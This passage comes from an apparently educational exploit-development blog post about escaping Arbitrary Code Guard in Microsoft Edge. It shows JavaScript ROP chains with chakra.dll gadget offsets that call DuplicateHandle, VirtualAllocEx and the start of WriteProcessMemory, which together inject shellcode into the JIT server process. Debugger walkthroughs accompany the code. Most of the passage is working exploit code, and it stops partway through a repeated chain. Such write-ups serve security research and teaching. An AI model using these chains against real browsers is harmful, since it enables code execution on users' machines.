<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion92.png" alt="">

Now that our function has succeeded, we need to make sure we return back to the stack in a manner that allows us to keep execution our ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion93.png" alt="">

When the `ret` is executed we hit our "fake return address" we placed on the stack before the call to `DuplicateHandle`. Our return address will simply jump over the shadow space and our last three `DuplicateHandle` parameters, and allow us to keep executing further down the stack (where subsequent ROP chains will be).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion94.png" alt="">

At this point we have successfully obtained a `PROCESS_ALL_ACCESS` handle to the JIT server process. With this handle, we can begin the process of compromising the JIT process, where ACG is disabled.

`VirtualAllocEx` ROP Chain
---

Now that we possess a handle to the JIT server with enough permissions to perform things like memory operations, let's now use this `PROCESS_ALL_ACCESS` handle to allocate some memory within the JIT process. However, before examining the ROP chain, let's recall the prototype for `VirtualAllocEx`:

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion95.png" alt="">

The function call will be as follows for us:

```c
VirtualAllocEx(
	fulljitHandle, 			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
	PAGE_READWRITE			// Make our memory readable and writable
);
```

Let's firstly break down why our call to `VirtualAllocEx` is constructed the way it is. The call to the function is very straight forward - we are essentially allocating a region of memory the size of our shellcode in the JIT process using our new handle to the JIT process. The main thing that sticks out to us is the `PAGE_READWRITE` allocation protection. As we recall, the JIT process doesn't have ACG enabled - meaning it is quite possible to have dynamic RWX memory in such a process. However, there is a slight caveat and that is when it comes to remote injection. ACG is documented to let processes that don't have ACG enabled to inject RWX memory into a process which _does_ have ACG enabled. After all, ACG was created with Microsoft Edge in mind. Since Edge uses an out-of-process JIT server architecture, it would make sense that the process not protected by ACG (the JIT server) can inject into the process with ACG (the content process). However, a process with ACG cannot inject into a process _without_ ACG using RWX memory. Because of this, we actually will place our shellcode into the JIT server using RW permissions. Then, we will eventually copy a ROP chain into the JIT process which marks the shellcode as RWX. This is possible, as ACG is disabled. The main caveat here is that it cannot _directly_ and _remotely_ be marked as RWX. At first, I tried allocating with RWX memory, thinking I could just do simple process injection. However, after testing and the API call failing, it turns our RWX memory can't directly be allocated when the injection stems from a process protected by ACG to a non-ACG process. This will all make more sense later, if it doesn't now, when we copy our ROP chain in to the JIT process.

Here is the ROP chain we will be working with (we will include our `DuplicateHandle` chain for continuity. Every ROP chain from here on out will be included with the previous one to make readability a bit better):

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
```

Let's start by setting a breakpoint on our first ROP gadget of `pop rax ; ret`, which is located at `chakra_base + 0x577fd4`. Our `DuplicateHandle` ROP chain uses this gadget two times. So, when we hit our breakpoint, we will hit `g` in WinDbg to jump over these two calls in order to debug our `VirtualAllocEx` ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion96.png" alt="">

This ROP chain starts out by attempting to act on the R9 register to load in the `flAllocationType` parameter. This is done via the `mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret` ROP gadget. As we previously discussed, the RCX register is used to copy the final parameter into R9. This means we need to place `MEM_COMMIT | MEM_RESERVE` into the RCX register, and let our target gadget copy the value into R9. However, we know that the RAX register is dereferenced. This means our first few gadgets:

1. Place a valid pointer in RAX to bypass the `cmp r8d, [rax]` check
2. Place `0x3000` (`MEM_COMMIT | MEM_RESERVE`) into RCX
3. Copy said value in R9 (along with an `add rsp, 0x28` which we know how to deal with by adding `0x28` bytes of padding)

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion97.png" alt="">

Our call to `VirtualAllocEx` is now in the following state:

```c
VirtualAllocEx(
	-
	-
	-
	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
	-
);
```

After R9 gets filled properly, our next step is to work on the `dwSize` parameter, which will go in R8. We can directly copy a value into R8 using the following ROP gadget: `mov r8, rdx ; add rsp, 0x48 ; ret`. All we have to do is place our intended value into RDX prior to this gadget, and it will be copied into R8 (along with an `add rsp, 0x48` - which we know how to deal with by adding some padding before our `ret`). The value we are going to place in R9 is `0x1000` which isn't the _exact_ size of our shellcode, but it will give us a good amount of space to work with as `0x1000` is more room than we actually need.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion98.png" alt="">

Our call to `VirtualAllocEx` is now in the following state:

```c
VirtualAllocEx(
	-
	-
	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
	-
);
```

The next parameter we will focus on is the `lpAddress` parameter. In this case, we are setting this value to `NULL` (or `0` in our case), as we want the OS to determine where our private allocation will be within the JIT process. This is done by simply popping a `0` value, which we can directly write to the stack after our `pop rdx` gadget using the write primitive, into RDX.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion99.png" alt="">

After executing the above ROP gadgets, our call to `VirtualAllocEx` is in the following state:

```c
VirtualAllocEx(
	-
	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
	-
);
```

At this point we have supplied 3/5 arguments for `VirtualAllocEx`. Our second-to-last parameter will be the `hProcess` parameter - which is our now duplicated-handle to the JIT server with `PROCESS_ALL_ACCESS` permissions. Here is how this code snippet looks:

```javascript
// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it
```

We can notice two things here - recall we stored the handle in an empty address within `.data` of `chakra.dll`. We simply can `pop` this pointer into RCX, and then dereference it to get the raw handle value. This arbitrary dereference gadget, where we can extract the value RCX points to, is followed by a write operation at the memory address in RAX + `0x20`. Recall we already have placed a writable address into RAX, so we simply can move on knowing we "bypass" this instruction, as the write operation won't cause an access violation - the memory in RAX is already writable.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion100.png" alt="">

Our call to `VirtualAllocEx` is now in the following state:

```c
VirtualAllocEx(
	fulljitHandle, 			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
	-
);
```

The last thing we need to do is twofold:
1. Place `VirtualAllocEx` into RAX
2. Directly write our last parameter at RSP + `0x28` (we have already explained why RSP + `0x28` instead of RSP + `0x20`) (this is done via our arbitrary write and _not_ via a ROP gadget)
3. `jmp rax` to kick off the call to `VirtualAllocEx`

Again, as a point of reiteration, we can see we simply can just write our last parameter to RSP + `0x28` instead of using a gadget to `mov [rsp+0x28], reg`.

```javascript
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
```

When this occurs, our call will be in the following (final) state:

```c
VirtualAllocEx(
	fulljitHandle, 			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
	PAGE_READWRITE			// Make our memory readable and writable
);
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion101.png" alt="">

We can step into the jump with `t` and then use `pt` to hit the `ret` of `VirtualAllocEx`. At this point, as is generally true in assembly, RAX should contain the return value of `VirtualAllocEx` - which should be a pointer to a block of memory within the JIT process, size `0x1000`, and RW.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion102.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion103.png" alt="">

If we try to examine this address within the debugger, we will see it is invalid memory.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion104.png" alt="">

However, if we attach a _new_ WinDbg session (without closing out the current one) to the JIT process (we have already shown multiple times in this blog post how to identify the JIT process) we can see this memory is committed.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion105.png" alt="">

As we can see, our second ROP chain was successful and we have allocated a page of RW memory within the JIT process. We will eventually write our shellcode into this allocation and use a final-stage ROP chain we will inject into the JIT process to mark this region as RWX.

`WriteProcessMemory` ROP Chain
---

At this point in our exploit, we have seen our ability to control memory within the remote JIT process - where ACG is disabled. As previously shown, we have allocated memory within the JIT process. Additionally, towards the beginning of the blog, we have stored our shellcode in the `.data` section of `chakra.dll` (see "Shellcode" section). We know this shellcode will never become executable in the current content process (where our exploit is executing) - so we need to inject it into the JIT process, where ACG is disabled. We will setup a call to `WriteProcessMemory` in order to write our shellcode into our new allocation within the JIT server.

Here is how our call to `WriteProcessMemory` will look:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	addressof(VirtualAllocEx_Allocation),		// Address of our return value from VirtualAllocEx (where we want to write our shellcode)
	addressof(data_chakra_shellcode_location),	// Address of our shellcode in the content process (.data of chakra) (what we want to write (our shellcode))
	sizeof(shellcode)				// Size of our shellcode
	NULL 						// Optional
);
```

Here is the instrumentation of our ROP chain (including `DuplicateHandle` and `VirtualAllocEx` for continuity purposes):

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
